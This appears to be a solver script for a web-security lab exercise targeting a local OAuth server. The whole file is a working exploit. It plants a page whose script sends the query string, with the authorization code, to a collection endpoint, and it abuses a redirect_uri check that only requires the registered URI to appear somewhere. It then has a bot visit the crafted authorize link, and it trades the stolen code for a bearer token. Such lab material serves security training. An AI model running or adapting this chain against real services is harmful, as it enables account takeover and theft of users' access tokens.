#!/usr/bin/env bash
# Lab 24 — the registered URI only has to *appear* in the one you supply.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9240}"
. "$(dirname "$0")/../lib/h5i.sh"
new_session lab24
ID="drop$$"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

# A page on the other origin that forwards whatever query string it is given.
PAGE="<html><body><script>
fetch('$URL/collect?id=$ID&c='+encodeURIComponent(location.search))
</script></body></html>"
send "$SESSION" req_0 --create --set method=POST --set path=/page \
    --set header.Content-Type=application/json \
    --set "json.name=cb$$" --set "json.html=$PAGE" >/dev/null

# The registered URI appears in this one — as the value of a parameter.
EVIL="http://127.0.0.1:9241/p/cb$$?next=http://127.0.0.1:9240/callback"
AUTH="$URL/oauth/authorize?client_id=notes&state=xyz&redirect_uri=$(
    python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$EVIL")"

send "$SESSION" req_0 --create --set method=POST --set path=/report \
    --set header.Content-Type=application/json --set "json.url=$AUTH" >/dev/null

CODE=""
for _ in $(seq 1 30); do
    CODE="$(send "$SESSION" req_0 --create --set path=/collected --set "query.id=$ID" | body |
        python3 -c 'import json,re,sys,urllib.parse
for row in json.load(sys.stdin)["rows"]:
    m = re.search(r"code=([0-9a-f]+)", urllib.parse.unquote(row))
    if m: print(m.group(1)); break
else: print("")')"
    [ -n "$CODE" ] && break
    sleep 1
done
[ -n "$CODE" ] || { echo "no code arrived"; exit 1; }

TOKEN="$(send "$SESSION" req_0 --create --set method=POST --set path=/oauth/token \
    --set header.Content-Type=application/json --set "json.code=$CODE" | jfield access_token)"

send "$SESSION" req_0 --create --set path=/api/profile \
    --set "header.Authorization=Bearer $TOKEN" | flag
